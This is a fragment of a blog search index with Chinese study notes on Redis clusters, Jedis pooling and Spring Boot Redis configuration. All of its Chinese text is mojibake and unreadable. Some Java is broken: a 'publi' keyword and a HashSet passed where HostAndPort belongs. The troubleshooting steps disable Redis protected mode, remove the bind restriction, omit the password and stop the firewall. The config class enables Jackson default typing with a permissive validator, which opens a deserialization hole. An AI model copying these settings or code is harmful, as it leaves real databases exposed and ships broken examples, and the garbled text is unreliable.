alt="ç»„åˆé›†ç¾¤"></p></li><li><p>æµ‹è¯•é›†ç¾¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -c -p ç«¯å£å·    # -cå‚æ•°å®ç°è‡ªåŠ¨é‡å®šå‘ï¼Œè¿æ¥å®¢æˆ·ç«¯</span><br><span class="line">cluster info    # æŸ¥çœ‹é›†ç¾¤çŠ¶æ€</span><br><span class="line">cluster nodes    # æŸ¥çœ‹èŠ‚ç‚¹ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%B5%8B%E8%AF%95%E9%9B%86%E7%BE%A4.h1u9gsuk0nc.jpg" alt="æµ‹è¯•é›†ç¾¤"></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œé›†ç¾¤æ­å»ºæˆåŠŸã€‚</p> <div class="note info no-icon flat"><p>Redis é›†ç¾¤æœ‰<code>16384</code>ä¸ª<code>å“ˆå¸Œæ§½</code>ï¼Œæ¯ä¸ª<code>key</code>é€šè¿‡<code>CRC16</code>æ ¡éªŒåå¯¹16384å–æ¨¡æ¥å†³å®šæ”¾ç½®å“ªä¸ªæ§½ã€‚é›†ç¾¤çš„æ¯ä¸ªèŠ‚ç‚¹è´Ÿè´£ä¸€éƒ¨åˆ†hashæ§½ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚å½“å‰é›†ç¾¤æœ‰3ä¸ªèŠ‚ç‚¹ABCï¼Œé‚£ä¹ˆï¼š</p><ul><li>èŠ‚ç‚¹ A åŒ…å« <code>0</code> åˆ° <code>5460</code>å·å“ˆå¸Œæ§½</li><li>èŠ‚ç‚¹ B åŒ…å«<code>5461</code> åˆ° <code>10922</code> å·å“ˆå¸Œæ§½</li><li>èŠ‚ç‚¹ C åŒ…å«<code>10923</code> åˆ° <code>16383</code>å·å“ˆå¸Œæ§½</li></ul></div><p>å°è¯•å¾€é›†ç¾¤ä¸­å†™å…¥æ•°æ®</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE.5rjk9tsc1xs0.jpg" alt="å†™å…¥æ•°æ®"></p><p>ä¸åœ¨ä¸€ä¸ª<code>slot</code>ä¸‹çš„é”®å€¼ï¼Œæ˜¯ä¸èƒ½ä½¿ç”¨<code>mgetã€msetç­‰å¤šé”®æ“ä½œ</code>ï¼Œä½†å¯é€šè¿‡<code>&#123;&#125;</code>å†…ç›¸åŒå†…å®¹çš„é”®å€¼å¯¹æ”¾åˆ°åŒä¸€ä¸ª<code>slot</code>ä¸­å»</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%A4%9A%E9%94%AE%E6%93%8D%E4%BD%9C.3ukznasnqym0.jpg" alt="å¤šé”®æ“ä½œ"></p><p>æŸ¥è¯¢é›†ç¾¤ä¸­çš„å€¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cluster keyslot &lt;key&gt;                # è®¡ç®—keyçš„æ’æ§½å€¼</span><br><span class="line">cluster countkeysinslot &lt;slot&gt;        # è¿”å›slotæ§½çš„é”®æ•°(åªèƒ½æŸ¥çœ‹è‡ªå·±æ’æ§½èŒƒå›´å†…çš„å€¼)</span><br><span class="line">cluster getkeysinslot &lt;slot&gt; &lt;count&gt;# è¿”å›countä¸ªslotæ§½ä¸­çš„é”®</span><br></pre></td></tr></table></figure></li><li><p>é›†ç¾¤çš„Jediså¼€å‘</p><p>æ— ä¸­å¿ƒåŒ–ä¸»ä»é›†ç¾¤ã€‚å³ä½¿è¿æ¥çš„ä¸æ˜¯ä¸»æœºï¼Œé›†ç¾¤ä¼šè‡ªåŠ¨åˆ‡æ¢ä¸»æœºå­˜å‚¨ã€‚éµå¾ª<code>ä¸»å†™ä»è¯»</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- jedisä¾èµ–åŒ…å¼•å…¥  --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JedisClusterTest</span></span>&#123;</span><br><span class="line">    <span class="function">publi <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">         Set&lt;HostAndPort&gt; set = <span class="keyword">new</span> HashSet&lt;HostAndPort&gt;();</span><br><span class="line">         set.add(<span class="keyword">new</span> HashSet&lt;HostAndPort&gt;(<span class="string">&quot;192.168.30.0&quot;</span>,<span class="number">6379</span>));</span><br><span class="line">         JedisCluster jc = <span class="keyword">new</span> JedisCluster(set);</span><br><span class="line">         jc.set(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;zeker&quot;</span>);</span><br><span class="line">         String value = jc.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">         System.out.println(value);</span><br><span class="line">         jc.close();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="é›†ç¾¤ä¼˜ç¼ºç‚¹">é›†ç¾¤ä¼˜ç¼ºç‚¹</h3><p>ä¼˜ç‚¹ï¼šå®ç°æ‰©å®¹ã€åˆ†æ‘Šå‹åŠ›ã€æ— ä¸­å¿ƒé…ç½®ç›¸å¯¹ç®€å•</p><p>ç¼ºç‚¹ï¼šå¤šé”®æ“ä½œã€å¤šé”®çš„Redisäº‹åŠ¡ã€luaè„šæœ¬å‡ä¸è¢«æ”¯æŒ</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring bootæ•´åˆRedis</title>
      <link href="/posts/b921ad40/"/>
      <url>/posts/b921ad40/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>Jedisã€Spring-data-redisçš„é…ç½®ä»¥åŠåŒºåˆ«</h1><h2 id="Jediså¦‚ä½•é…ç½®">Jediså¦‚ä½•é…ç½®</h2><ol><li>jediså¼•å…¥ä¾èµ–</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--        Jediså¼•å…¥ä¾èµ–--&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>è¿æ¥Rediså®¢æˆ·ç«¯</p><ol><li><p>Jedisç›´è¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Jedis jedis = <span class="keyword">new</span> Jedis(<span class="string">&quot;192.168.30.0&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">jedis.set(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">String value = jedis.get(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>JedisPool è¿æ¥æ± çš„ä½¿ç”¨</p><p>é…ç½®æ–‡ä»¶<code>jedis.properties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># èµ„æºæ± æœ€å¤§è¿æ¥æ•°</span><br><span class="line">maxTotal=<span class="number">50</span>             </span><br><span class="line"># èµ„æºæ± å…è®¸æœ€å¤§ç©ºé—²è¿æ¥æ•°</span><br><span class="line">maxIdle=<span class="number">10</span>              </span><br><span class="line"># redisæœåŠ¡å™¨åœ°å€</span><br><span class="line">host=<span class="number">192.168</span><span class="number">.30</span><span class="number">.0</span> </span><br><span class="line"># rediså¼€æ”¾ç«¯å£</span><br><span class="line">port=<span class="number">6379</span>             </span><br></pre></td></tr></table></figure><p>ç±»<code>JedisUtils.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPoolConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JedisUtils</span> </span>&#123;</span><br><span class="line">    <span class="comment">//åˆ›å»ºä¸€ä¸ªè¿æ¥æ± </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JedisPool jedisPool;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="comment">//è¯»å–é…ç½®æ–‡ä»¶</span></span><br><span class="line">        InputStream is = JedisUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;jedis.properties&quot;</span>);</span><br><span class="line">        Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            pro.load(is);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¿æ¥æ± é…ç½®</span></span><br><span class="line">        JedisPoolConfig config=<span class="keyword">new</span> JedisPoolConfig();</span><br><span class="line">        config.setMaxTotal(Integer.parseInt(pro.getProperty(<span class="string">&quot;maxTotal&quot;</span>)));</span><br><span class="line">        config.setMaxIdle(Integer.parseInt(pro.getProperty(<span class="string">&quot;maxIdle&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆå§‹åŒ–è¿æ¥æ± ï¼ŒæŠŠå¯¹åº”å‚æ•°ä¼ é€’è¿›å»</span></span><br><span class="line">        jedisPool=<span class="keyword">new</span> JedisPool(config,pro.getProperty(<span class="string">&quot;host&quot;</span>), Integer.parseInt(pro.getProperty(<span class="string">&quot;port&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è®¾ç½®å¥½åè¿”å›ï¼Œè¿”å›ä¸€ä¸ªJediså¯¹è±¡</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Jedis <span class="title">getJedis</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> jedisPool.getResource();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç±»<code>JedisTest.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//è·å–è¿æ¥æ± å¯¹è±¡</span></span><br><span class="line">            jedis = JedisUtils.getJedis();</span><br><span class="line">            <span class="comment">//æ‰§è¡Œæ“ä½œ</span></span><br><span class="line">            jedis.set(<span class="string">&quot;java&quot;</span>, <span class="string">&quot;good&quot;</span>);</span><br><span class="line">            System.out.println(jedis.get(<span class="string">&quot;java&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//è¿™é‡Œä½¿ç”¨çš„closeä¸ä»£è¡¨å…³é—­è¿æ¥ï¼ŒæŒ‡çš„æ˜¯å½’è¿˜èµ„æº</span></span><br><span class="line">                jedis.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>Jedis<code>ç›´è¿</code>ä¸Jedis<code>è¿æ¥æ± </code>ä½¿ç”¨çš„å¯¹æ¯”</p><table><thead><tr><th>æ–¹æ¡ˆ</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>Jedisç›´è¿</td><td>ç®€å•æ–¹ä¾¿<br>é€‚ç”¨äºè¿æ¥æ•°è¾ƒå°‘ä¸”ä½¿ç”¨æ—¶é—´è¾ƒé•¿ï¼Œå¯æ„æˆé•¿è¿æ¥åœºæ™¯</td><td>å­˜åœ¨æ¯æ¬¡æ–°å»º/å…³é—­TCPå¼€é”€<br>èµ„æºæ— æ³•æ§åˆ¶ï¼Œå­˜åœ¨è¿æ¥æ³„éœ²çš„å¯èƒ½<br>Jediså¯¹è±¡çº¿ç¨‹ä¸å®‰å…¨</td></tr><tr><td>Jedisè¿æ¥æ± </td><td>Jedisé¢„å…ˆç”Ÿæˆï¼Œé™ä½å¼€é”€<br>è¿æ¥æ± çš„å½¢æˆä¿æŠ¤å’Œæ§åˆ¶èµ„æºçš„ä½¿ç”¨</td><td>ç›¸å¯¹äºç›´è¿ï¼Œä½¿ç”¨ç›¸å¯¹éº»çƒ¦ï¼Œå°¤å…¶åœ¨èµ„æºç®¡ç†ä¸Šéœ€è¦å¾ˆå¤šå‚æ•°æ¥ä¿è¯ï¼Œä¸€æ—¦è§„åˆ’ä¸åˆç†å°±ä¼šå‡ºç°é—®é¢˜</td></tr></tbody></table></li></ol><h2 id="Spring-data-rediså¦‚ä½•é…ç½®">Spring-data-rediså¦‚ä½•é…ç½®</h2><ol><li>spring-data-rediså¼•å…¥ä¾èµ–</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--        redis--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.6</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>æ·»åŠ é…ç½®æ–‡ä»¶<code>application.properties</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#RedisæœåŠ¡å™¨åœ°å€</span><br><span class="line">spring.redis.host=<span class="number">192.168</span><span class="number">.30</span><span class="number">.0</span></span><br><span class="line">#RedisæœåŠ¡å™¨è¿æ¥ç«¯å£ï¼ˆé»˜è®¤ç«¯å£ä¸º<span class="number">6379</span>ï¼‰</span><br><span class="line">spring.redis.port=<span class="number">6379</span></span><br><span class="line">#Redisæ•°æ®åº“ç´¢å¼•ï¼ˆé»˜è®¤ä½<span class="number">0</span>ï¼‰</span><br><span class="line">spring.redis.database=<span class="number">0</span></span><br><span class="line">#è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span><br><span class="line">spring.redis.timeout=<span class="number">1800000</span></span><br><span class="line">#è¿æ¥æ± æœ€å¤§è¿æ¥æ•°ï¼ˆä½¿ç”¨è´Ÿå€¼è¡¨ç¤ºæ²¡æœ‰é™åˆ¶ï¼‰</span><br><span class="line">spring.redis.lettuce.pool.max-active=<span class="number">20</span></span><br><span class="line">#æœ€å¤§é˜»å¡ç­‰å¾…æ—¶é—´ï¼ˆå¤æ•°è¡¨ç¤ºæ²¡æœ‰é™åˆ¶ï¼‰</span><br><span class="line">spring.redis.lettuce.pool.max-wait=-<span class="number">1</span></span><br><span class="line">#è¿æ¥æ± ä¸­çš„æœ€å¤§ç©ºé—²è¿æ¥</span><br><span class="line">spring.redis.lettuce.pool.max-idle=<span class="number">5</span></span><br><span class="line">#è¿æ¥æ± ä¸­çš„æœ€å°ç©ºé—²è¿æ¥</span><br><span class="line">spring.redis.lettuce.pool.min-idle=<span class="number">0</span></span><br></pre></td></tr></table></figure><ol start="3"><li>æ·»åŠ Redisé…ç½®ç±»<code>RedisConfig.java</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title">redisTemplate</span><span class="params">(RedisConnectionFactory factory)</span> </span>&#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> RedisTemplate();</span><br><span class="line">        RedisSerializer&lt;String&gt; redisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object.class);</span><br><span class="line">        ObjectMapper om = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        om.activateDefaultTyping(LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(om);</span><br><span class="line">        template.setConnectionFactory(factory);</span><br><span class="line">        template.setKeySerializer(redisSerializer);</span><br><span class="line">        template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CacheManager <span class="title">cacheManager</span><span class="params">(RedisConnectionFactory factory)</span> </span>&#123;</span><br><span class="line">        RedisSerializer&lt;String&gt; redisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object.class);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        objectMapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);</span><br><span class="line">        RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig()</span><br><span class="line">                .entryTtl(Duration.ofSeconds(<span class="number">600</span>))</span><br><span class="line">                .serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(redisSerializer))</span><br><span class="line">                .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(jackson2JsonRedisSerializer))</span><br><span class="line">                .disableCachingNullValues();</span><br><span class="line">        RedisCacheManager cacheManager = RedisCacheManager.builder(factory)</span><br><span class="line">                .cacheDefaults(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">return</span> cacheManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>åˆ›å»ºControllerè¯•éªŒä¸€ä¸‹</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/redisTest&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisTestControllor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testRedis</span><span class="params">()</span></span>&#123;</span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;zeker&quot;</span>);</span><br><span class="line">        String name = (String) redisTemplate.opsForValue().get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>æ ¹æ®è‡ªå·±å¼€è®¾çš„ç«¯å£è®¿é—®<code>http://localhost:8080/redisTest</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210806/666ae2ea6a519635d9932f43f286144.mt0bja0dxmo.png" alt="1"></p><h2 id="å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ³•">å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ³•</h2><div class="note info no-icon flat"><p>Could not get a resource from the pool; nested exception is io.lettuce.core.RedisConnectionException: Unable to connect to 192.168.30.0:6379</p></div><p>1ã€æŸ¥çœ‹æ˜¯å¦å¯åŠ¨RedisæœåŠ¡å™¨</p><p>2ã€æŸ¥çœ‹ç›®æ ‡IPåœ°å€æ˜¯å¦å¯ä»¥pingé€š</p><p>3ã€Redisçš„é…ç½®application.ymlï¼ˆæˆ–application.propertiesï¼‰ä¸­spring.redis.timeoutè¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ä¸­è®¾ç½®ä¸èƒ½ä¸º0</p><p>4ã€ä¿®æ”¹redisçš„é…ç½®æ–‡ä»¶redis.conf</p><ol><li>protected-mode yes æ”¹ä¸º protected-mode no<br>ï¼ˆè¯¥é…ç½®é¡¹è¡¨ç¤ºæ˜¯å¦å¼€å¯ä¿æŠ¤æ¨¡å¼ï¼Œé»˜è®¤æ˜¯å¼€å¯ï¼Œå¼€å¯åRedisåªä¼šæœ¬åœ°è¿›è¡Œè®¿é—®ï¼Œæ‹’ç»å¤–éƒ¨è®¿é—®ï¼‰</li><li>æ³¨é‡Šæ‰ bin127.0.0.1 å³ #bin 127.0.0.1<br>ï¼ˆPS: ä¸æ³¨é‡Šæ‰ï¼Œè¡¨ç¤ºæŒ‡å®š Redis åªæ¥æ”¶æ¥è‡ªäºè¯¥ IP åœ°å€çš„è¯·æ±‚ï¼Œæ³¨é‡Šæ‰åï¼Œåˆ™è¡¨ç¤ºå°†å¤„ç†æ‰€æœ‰è¯·æ±‚ï¼‰</li></ol><div class="note warning flat"><p>ä¿®æ”¹é…ç½®æ–‡ä»¶redis.confåè®°å¾—ä¿å­˜é‡å¯redis</p></div><p>5ã€å¦‚æœåœ¨Redisä¸­æ²¡æœ‰é…ç½®requirepassï¼Œé‚£ä¹ˆåœ¨application.propertiesï¼ˆæˆ–application.yamlï¼‰ä¸­å°±ä¸è¦å†™spring.redis.password</p><p>6ã€å¼€æ”¾å¯¹åº”ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=6379/tcp# å¼€æ”¾6379ç«¯å£å·</span><br><span class="line">firewall-cmd --query-port=6379/tcp# æŸ¥çœ‹ç«¯å£å·æ˜¯å¦æ‰“å¼€</span><br></pre></td></tr></table></figure><div class="note info no-icon flat"><p>PSï¼šäº‘æœåŠ¡å™¨éœ€åœ¨å®‰å…¨ç»„ä¸­è®¾ç½®å¯¹åº”ç«¯å£å·ï¼Œä¸å»ºè®®å¼€æ”¾æ‰€æœ‰ç«¯å£ã€‚åœ¨<code>è™šæ‹Ÿæœºä¸Šæµ‹è¯•</code>ä¹Ÿå¯ä»¥é€‰æ‹©å…³é—­é˜²ç«å¢™<code>systemctl stop firewalld</code>ã€‚</p></div><h2 id="æ€»ç»“">æ€»ç»“</h2><p><code>Jedis</code>æ˜¯Rediså®˜æ–¹æ¨èçš„é¢å‘Javaçš„æ“ä½œRedisçš„å®¢æˆ·ç«¯ï¼Œè€Œ<code>RedisTemplate</code>æ˜¯<code>Spring-data-redis</code>ä¸­å¯¹<code>Jedis</code>Apiçš„é«˜åº¦å°è£…ã€‚</p><p><code>Spring-data-redis</code>ç›¸å¯¹äºJedisæ¥è¯´å¯ä»¥æ–¹ä¾¿åœ°æ›´æ¢Redisçš„Javaå®¢æˆ·ç«¯ï¼Œæ¯”Jediså¤šäº†è‡ªåŠ¨ç®¡ç†è¿æ¥æ± 